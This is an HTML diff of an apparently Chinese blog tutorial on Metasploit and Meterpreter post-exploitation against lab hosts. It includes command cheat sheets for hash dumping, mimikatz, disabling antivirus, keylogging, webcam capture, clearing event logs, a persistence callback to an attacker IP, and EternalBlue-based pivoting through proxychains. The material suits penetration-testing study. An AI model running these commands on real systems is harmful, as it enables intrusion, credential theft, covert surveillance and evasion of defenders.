class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><code class="hljs bash">Meterpreter &gt; ?<br>==========================================<br>核心命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>?                             帮助菜单<br>background                    把当前会话挂到后台运行<br><span class="hljs-built_in">bg</span>                            background命令的别名<br>bgkill                        杀死后台meterpreter 脚本<br>bglist                        列出正在运行的后台脚本<br>bgrun                         执行一个meterpreter脚本作为后台线程<br>channel                       显示信息或控制活动频道<br>close                         关闭一个频道<br>detach                        分离Meterpreter会话（用于 http/https）<br>disable_unicode_encoding      禁用 unicode 字符串的编码<br>enable_unicode_encoding       启用 unicode 字符串的编码<br><span class="hljs-built_in">exit</span>                          终止 Meterpreter 会话<br>get_timeouts                  获取当前会话超时值<br>guid                          获取会话 GUID<br><span class="hljs-built_in">help</span>                          帮助菜单<br>info                          显示有关 Post 模块的信息<br>irb                           在当前会话中打开一个交互式 Ruby shell<br>load                          加载一个或多个 Meterpreter 扩展<br>machine_id                    获取连接到会话的机器的 MSF ID<br>migrate                       将服务器迁移到另一个进程<br>pivot                         管理枢轴侦听器<br>pry                           在当前会话上打开 Pry 调试器<br>quit                          终止 Meterpreter 会话<br><span class="hljs-built_in">read</span>                          从通道读取数据<br>resource                      运行存储在文件中的命令<br>run                           执行一个 Meterpreter 脚本或 Post 模块<br>secure                       （重新）协商会话上的 TLV 数据包加密<br>sessions                      快速切换到另一个会话<br>set_timeouts                  设置当前会话超时值<br><span class="hljs-built_in">sleep</span>                         强制 Meterpreter 安静，然后重新建立会话<br>ssl_verify                    修改 SSL 证书验证设置<br>transport                     管理运输机制<br>use                           不推荐使用的load命令别名<br>uuid                          获取当前会话的 UUID<br>write                         将数据写入通道<br><br>==========================================<br>Stdapi：文件系统命令<br>==========================================<br><br>命令                           说明<br>-------                       ------------<br><span class="hljs-built_in">cat</span>                           将文件内容读到屏幕上<br><span class="hljs-built_in">cd</span>                            切换目录<br>checksum                      检索文件的校验和<br><span class="hljs-built_in">cp</span>                            将源复制到目标<br>del                           删除指定文件<br><span class="hljs-built_in">dir</span>                           列出文件（<span class="hljs-built_in">ls</span> 的别名）<br>download                      下载文件或目录<br>edit                          编辑文件<br>getlwd                        打印本地工作目录<br>getwd                         打印工作目录<br>lcd                           更改本地工作目录<br>lls                           列出本地文件<br>lpwd                          打印本地工作目录<br><span class="hljs-built_in">ls</span>                            列出文件<br><span class="hljs-built_in">mkdir</span>                         制作目录<br><span class="hljs-built_in">mv</span>                            将源移动到目标<br><span class="hljs-built_in">pwd</span>                           打印工作目录<br><span class="hljs-built_in">rm</span>                            删除指定文件<br><span class="hljs-built_in">rmdir</span>                         删除目录<br>search                        搜索文件<br>show_mount                    列出所有挂载点/逻辑驱动器<br>upload                        上传文件或目录<br><br>==========================================<br>Stdapi：网络命令<br>==========================================<br>命令                           说明<br>-------                       ------------<br>arp                           显示主机 ARP 缓存<br>getproxy                      显示当前代理配置<br>ifconfig                      显示界面<br>ipconfig                      显示接口<br>netstat                       显示网络连接<br>portfwd                       将本地端口转发到远程服务<br>resolve                       解析目标上的一组主机名<br>route                         查看和修改路由表<br><br>==========================================<br>Stdapi：系统命令<br>==========================================<br>命令                           说明<br>-------                       ------------<br>clearev                       清除事件日志<br>drop_token                    放弃任何活动的模拟令牌。<br>execute                       执行命令<br>getenv                        获取一个或多个环境变量值<br>getpid                        获取当前进程标识符<br>getprivs                      尝试启用当前进程可用的所有权限<br>getid                         获取服务器运行的用户的 SID<br>getuid                        获取服务器运行的用户<br><span class="hljs-built_in">kill</span>                          终止进程<br>localtime                     显示目标系统本地日期和时间<br>pgrep                         按名称过滤进程<br>pkill                         按名称终止进程<br>ps                            列出正在运行的进程<br>reboot                        重启远程计算机<br>reg                           修改远程注册表并与之交互<br>rev2self                      在远程机器上调用 RevertToSelf()<br>shell                         放入系统命令 shell<br>shutdown                      关闭远程计算机<br>steal_token                   尝试从目标进程窃取模拟令牌<br><span class="hljs-built_in">suspend</span>                       暂停或恢复进程列表<br>sysinfo                       获取有关远程系统的信息，例如 OS<br><br>==========================================<br>Stdapi：用户界面命令<br>==========================================<br>命令                           说明<br>-------                       ------------<br>enumdesktops                  列出所有可访问的桌面和窗口站<br>getdesktop                    获取当前的meterpreter桌面<br>idletime                      返回远程用户空闲的秒数<br>keyboard_send                 发送击键<br>keyevent                      发送按键事件<br>keyscan_dump                  转储击键缓冲区<br>keyscan_start                 开始捕获击键<br>keyscan_stop                  停止捕获击键<br>mouse                         发送鼠标事件<br>screenshare                   实时观看远程用户桌面<br>screenshot                    抓取交互式桌面的截图<br>setdesktop                    更改meterpreters当前桌面<br>uictl                         控制一些用户界面组件<br><br>==========================================<br>Stdapi：网络摄像头命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>record_mic                    从默认麦克风录制音频 X 秒<br>webcam_chat                   开始视频聊天<br>webcam_list                   列出网络摄像头<br>webcam_snap                   从指定的网络摄像头拍摄快照<br>webcam_stream                 从指定的网络摄像头播放视频流<br><br>==========================================<br>Stdapi：音频输出命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>play                          在目标系统上播放波形音频文件 (.wav)<br><br>==========================================<br>Priv：权限提升命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>getsystem                     尝试将您的权限提升到本地系统的权限。<br><br>==========================================<br>Priv：密码数据库命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>hashdump                      转储 SAM 数据库的内容<br><br>==========================================<br>Priv：Timestomp 命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>timestomp                     操作文件 MACE 属性<br><br>meterpreter &gt;<br></code></pre></td></tr></table></figure>
+
+<p>我们输入： <code>shell</code>即可切换到目标主机的<code>windows cmd_shell</code>里面：<br>命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">shell         <span class="hljs-comment">#获取目标主机的cmd_shell权限</span><br>chcp 65001    <span class="hljs-comment">#这里为了避免目标主机cmd_shell字符乱码，设置目标主机命令行的字符编码，65001是UTF-8</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107205853047.png" srcset="/img/loading.gif" lazyload alt="image-20240107205853047"></p>
+<p>要想从目标主机shell退出到<code>meterpreter</code> ，我们只需输入：<code>exit</code>:</p>
+<p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107205915153.png" srcset="/img/loading.gif" lazyload alt="image-20240107205915153"></p>
+<p>从<code>meterpreter</code>退出到<code>MSF框架</code>:<br>命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">background   <span class="hljs-comment">#把我们获得的meterpreter会话挂载到后台运行</span><br></code></pre></td></tr></table></figure>
+
+<p>查看前面获得的<code>meterpreter_shell</code>会话，最前面的数字是会话的id：<br>命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sessions  -l    <span class="hljs-comment">#查看获得的meterpreter_shell会话列表</span><br></code></pre></td></tr></table></figure>
+
+<p>输入sessions [id号]即可进入相应的<code>meterpreter_shell</code>中：</p>
+<p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107210018273.png" srcset="/img/loading.gif" lazyload alt="image-20240107210018273"></p>
+<p>输入：shell即可进入 cmd 类型的控制，再输入：powershell，即可进入 powershell 类型的控制台:</p>
+<p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107210038608.png" srcset="/img/loading.gif" lazyload alt="image-20240107210038608"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysinfo             									<span class="hljs-comment">#查看目标主机系统信息</span><br>run scraper         									<span class="hljs-comment">#查看目标主机详细信息</span><br>run hashdump        									<span class="hljs-comment">#导出密码的哈希</span><br>load kiwi           									<span class="hljs-comment">#加载mimikatz</span><br>ps                  									<span class="hljs-comment">#查看目标主机进程信息</span><br><span class="hljs-built_in">pwd</span>                		 								<span class="hljs-comment">#查看目标当前目录(windows)</span><br>getlwd              									<span class="hljs-comment">#查看目标当前目录(Linux)</span><br>search -f *.jsp -d e:\                					<span class="hljs-comment">#搜索E盘中所有以.jsp为后缀的文件</span><br>download  e:\test.txt  /root          					<span class="hljs-comment">#将目标机的e:\test.txt文件下载到/root目录下</span><br>upload    /root/test.txt d:\<span class="hljs-built_in">test</span>      					<span class="hljs-comment">#将/root/test.txt上传到目标机的 d:\test\ 目录下</span><br>getpid             										<span class="hljs-comment">#查看当前Meterpreter Shell的进程PID</span><br>migrate 1384        									<span class="hljs-comment">#将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span><br>idletime           		 								<span class="hljs-comment">#查看主机运行时间</span><br>getuid              									<span class="hljs-comment">#查看获取的当前权限</span><br>getsystem           									<span class="hljs-comment">#提权,获得的当前用户是administrator才能成功</span><br>run  killav        			 							<span class="hljs-comment">#关闭杀毒软件</span><br>screenshot          									<span class="hljs-comment">#截图</span><br>webcam_list         									<span class="hljs-comment">#查看目标主机的摄像头</span><br>webcam_snap         									<span class="hljs-comment">#拍照</span><br>webcam_stream       									<span class="hljs-comment">#开视频</span><br>execute 参数 -f 可执行文件   							    <span class="hljs-comment">#执行可执行程序</span><br>run getgui -u test1 -p Abc123456    					<span class="hljs-comment">#创建test1用户，密码为Abc123456</span><br>run getgui -e                							<span class="hljs-comment">#开启远程桌面</span><br>keyscan_start                							<span class="hljs-comment">#开启键盘记录功能</span><br>keyscan_dump                			 				<span class="hljs-comment">#显示捕捉到的键盘记录信息</span><br>keyscan_stop                 							<span class="hljs-comment">#停止键盘记录功能</span><br>uictl  <span class="hljs-built_in">disable</span>  keyboard     							<span class="hljs-comment">#禁止目标使用键盘</span><br>uictl  <span class="hljs-built_in">enable</span>   keyboard     							<span class="hljs-comment">#允许目标使用键盘</span><br>uictl  <span class="hljs-built_in">disable</span>  mouse        							<span class="hljs-comment">#禁止目标使用鼠标</span><br>uictl  <span class="hljs-built_in">enable</span>   mouse        							<span class="hljs-comment">#允许目标使用鼠标</span><br>load                        							<span class="hljs-comment">#使用扩展库</span><br>run				             							<span class="hljs-comment">#使用扩展库</span><br> <br>run exploit/windows/local/persistence lhost=192.168.100.132 lport=8888        <span class="hljs-comment">#会自动连接192.168.100.132的8888端口，缺点是容易被杀毒软件查杀</span><br>portfwd add -l 9999 -r 192.168.100.158 -p 3389     		<span class="hljs-comment">#将192.168.11.13的3389端口转发到本地的9999端口上，这里的192.168.100.158是获取权限的主机的ip地址</span><br>clearev                       <span class="hljs-comment">#清除日志</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><h6 id="Post-后渗透模块"><a href="#Post-后渗透模块" class="headerlink" title="Post 后渗透模块"></a>Post 后渗透模块</h6><p>该模块主要用于在取得目标主机系统远程控制权后，进行一系列的后渗透攻击动作。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">run post/windows/manage/migrate                			<span class="hljs-comment">#自动进程迁移</span><br>run post/windows/gather/checkvm                			<span class="hljs-comment">#查看目标主机是否运行在虚拟机上</span><br>run post/windows/manage/killav                			<span class="hljs-comment">#关闭杀毒软件</span><br>run post/windows/manage/enable_rdp            			<span class="hljs-comment">#开启远程桌面服务</span><br>run post/windows/manage/autoroute              			<span class="hljs-comment">#查看路由信息</span><br>run post/windows/gather/enum_logged_on_users    		<span class="hljs-comment">#列举当前登录的用户</span><br>run post/windows/gather/enum_applications       		<span class="hljs-comment">#列举应用程序</span><br>run post/windows/gather/credentials/windows_autologin 	<span class="hljs-comment">#抓取自动登录的用户名和密码</span><br>run post/windows/gather/smart_hashdump               	<span class="hljs-comment">#dump出所有用户的hash</span><br></code></pre></td></tr></table></figure>
+
+<p>查看主机是否运行在虚拟机上，可以看出主机是在虚拟机环境：<br>命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run post/windows/gather/checkvm<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107210350087.png" srcset="/img/loading.gif" lazyload alt="image-20240107210350087"></p>
+<p>拿到目标主机的shell后第一件事就是关闭掉目标主机的杀毒软件，通过命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run  killav<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107210422413.png" srcset="/img/loading.gif" lazyload alt="image-20240107210422413"></p>
+<p>获取目标主机的详细信息</p>
+<p>命令:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run scraper <br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107210505550.png" srcset="/img/loading.gif" lazyload alt="image-20240107210505550"></p>
+<p>它将目标机器上的常见信息收集起来然后下载保存在本地</p>
+</li>
+</ul>
+<h6 id="上传-x2F-下载文件"><a href="#上传-x2F-下载文件" class="headerlink" title="上传&#x2F;下载文件"></a>上传&#x2F;下载文件</h6><p>  命令：</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">download  file <span class="hljs-comment">#命令可以帮助我们从目标系统中下载文件</span><br></code></pre></td></tr></table></figure>
+
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">upload  file  <span class="hljs-comment">#命令则能够向目标系统上传文件。</span><br></code></pre></td></tr></table></figure>
+
+<h6 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h6><p>  命令：</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">getuid<br><span class="hljs-comment">#命令可以获取当前用户的信息，可以看到，当我们使用 getsystem进行提权后，用户身材为  NT AUTHORITY\SYSTEM ，这个也就是Windows的系统权限。</span><br>getsystem<br><span class="hljs-comment">#自动提权为系统权限</span><br></code></pre></td></tr></table></figure>
+
+<p>  <img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107210650338.png" srcset="/img/loading.gif" lazyload alt="image-20240107210650338"></p>
+<p>  注：执行getsystem命令后，会显示错误，但是其实已经运行成功了！</p>
+<h5 id="运行程序："><a href="#运行程序：" class="headerlink" title="运行程序："></a>运行程序：</h5><p>  先查看目标主机安装了哪些应用：<br>  命令：</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run post/windows/gather/enum_applications  <span class="hljs-comment">#查看目标主机安装了哪些应用</span><br></code></pre></td></tr></table></figure>
+
+<p>  <img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107210722073.png" srcset="/img/loading.gif" lazyload alt="image-20240107210722073"></p>
+<p>  在meterpreter_shell命令行执行目标系统中的应用程序：<br>  命令:</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#execute命令用法：</span><br>execute [参数] -f 指定的可执行文件<br><br>-f：指定可执行文件<br>-H：创建一个隐藏进程<br>-a：传递给命令的参数<br>-i：跟进程进行交互<br>-m：从内存中执行<br>-t：使用当前伪造的线程令牌运行进程<br>-s：在给定会话中执行进程<br></code></pre></td></tr></table></figure>
+
+<p>  <img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107210807916.png" srcset="/img/loading.gif" lazyload alt="image-20240107210807916"></p>
+<p>  开启远程桌面：<br>  命令：</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run post/windows/manage/enable_rdp<br></code></pre></td></tr></table></figure>
+
+<p>  先查看目标主机有哪些用户：<br>  命令：</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run post/windows/gather/enum_logged_on_users  <span class="hljs-comment">#查看目标主机有用户</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h4><p>  1、配置路由</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#配置静态路由让这个session3来转发访问192.168.52.0/24这个网段的所有流量``msf &gt; run autoroute -s 192.168.52.0/24</span><br></code></pre></td></tr></table></figure>
+
+<p>  2、使用background命令将该shell放在后台，使用route print查看配置是否成功</p>
+<p>  3、msf开启sock4代理</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf &gt; use auxiliary/server/socks_proxy<br>msf &gt; <span class="hljs-built_in">set</span> version 4a<br>msf &gt; <span class="hljs-built_in">set</span> srvhost 192.168.118.128&lt;br&gt;<br>msf &gt; <span class="hljs-built_in">set</span> srvport 1080<br>msf &gt; exploit<br></code></pre></td></tr></table></figure>
+
+<p>  此时已经开启代理监听在1080端口</p>
+<p>  4、修改&#x2F;etc&#x2F;proxychains4.conf文件，即proxychains配置文件</p>
+<p>  <img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107211506563.png" srcset="/img/loading.gif" lazyload alt="image-20240107211506563"></p>
+<h4 id="portfwd端口转发"><a href="#portfwd端口转发" class="headerlink" title="portfwd端口转发"></a>portfwd端口转发</h4><p>  portfwd是meterpreter提供的一种基本的端口转发。porfwd可以反弹单个端口到本地，并且监听，使用方法如下:</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">portfwd add -l 9999 -r 192.168.100.158 -p 3389   <br><span class="hljs-comment">#将192.168.100.158的3389端口转发到本地的9999端口上，这里的192.168.100.158是获取权限的主机的ip地址</span><br>-l:   <span class="hljs-comment">#本地监听的端口，用于接收目标主机的端口反弹</span><br>-p:   <span class="hljs-comment">#目标服务器的端口；</span><br>add:  <span class="hljs-comment">#添加一个连接</span><br></code></pre></td></tr></table></figure>
+
+<p>  然后我们只要访问本地的3389端口就可以连接到目标主机的3389端口了:</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">rdesktop 127.0.0.1:9999<br><span class="hljs-comment">#因为通过端口转发功能已经把3389的流量转发到本地的9999端口，所以只要连接本地的9999端口就相当于连接了目标机器的3389端口；</span><br></code></pre></td></tr></table></figure>
+
+<p>  如果不想继续连接的话，可以删除当前建立的连接，执行以下命令：</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">portfwd delet -l 9999 -r 192.168.100.158 -p 3389   <br>delet:  <span class="hljs-comment">#删除一个连接</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a><strong>实战演示</strong></h1><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183413048.png" srcset="/img/loading.gif" lazyload alt="image-20240107183413048"></p>
 <ul>
-<li>通过永恒之蓝拿到跳板机<br><img src="https://img-blog.csdnimg.cn/20210503223229837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></li>
-<li>拿到跳板机之后添加路由<br><img src="https://img-blog.csdnimg.cn/20210503223357503.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></li>
+<li>通过永恒之蓝拿到跳板机<br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183420867.png" srcset="/img/loading.gif" lazyload alt="image-20240107183420867"></li>
+<li>拿到跳板机之后添加路由<br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183430002.png" srcset="/img/loading.gif" lazyload alt="image-20240107183430002"></li>
 </ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">添加攻击IP添加到目标机路由表中<br><br>也可以 run autoroute -s 10.10.10.0/24<br><br>或者手动添加<br><br>route add 10.10.10.0 255.255.255.0<br></code></pre></td></tr></table></figure>
 <ul>
-<li>接下来设置代理<br><img src="https://img-blog.csdnimg.cn/20210503223655707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></li>
+<li>接下来设置代理<br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183438812.png" srcset="/img/loading.gif" lazyload alt="image-20240107183438812"></li>
 </ul>
 <p>接下来用kali上的神奇proxychains</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi /etc/proxychains.conf<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210503223622621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>测试是否能连内网的机器<br><img src="https://img-blog.csdnimg.cn/20210503223722102.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>可以成功连接<br>通过代理工具开启msf<br><img src="https://img-blog.csdnimg.cn/20210503223753299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>接下来就可以直接搞内网了。实战中可能有多层网段。就需要挂多层代理</p>
+<p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183447125.png" srcset="/img/loading.gif" lazyload alt="image-20240107183447125"><br>测试是否能连内网的机器<br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183455089.png" srcset="/img/loading.gif" lazyload alt="image-20240107183455089"><br>可以成功连接<br>通过代理工具开启msf<br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183506484.png" srcset="/img/loading.gif" lazyload alt="image-20240107183506484"><br>接下来就可以直接搞内网了。实战中可能有多层网段。就需要挂多层代理</p>
 <p>msf中有很多  攻击载荷模块，嗅探模块和后渗透模块。大家后期可以深入的去研究研究。</p>
 
               
@@ -324,7 +453,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" class="category-chain-item">内网安全</a>
+  <a href="../../../../../categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" class="category-chain-item">工具使用</a>
   
   
 
@@ -339,9 +468,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">#内网安全</a>
-      
-        <a href="/tags/msf/">#msf</a>
+        <a href="../../../../../tags/msf/">#msf</a>
       
     </div>
   
@@ -396,7 +523,7 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/06/15/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="powershell基础知识">
+                      <a href="../../powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/powershell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="powershell基础知识">
                         <i class="iconfont icon-arrowleft"></i>
                         <span class="hidden-mobile">powershell基础知识</span>
                         <span class="visible-mobile">上一篇</span>
@@ -406,7 +533,7 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/" title="查找域管理员进程">
+                      <a href="../../%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/" title="查找域管理员进程">
                         <span class="hidden-mobile">查找域管理员进程</span>
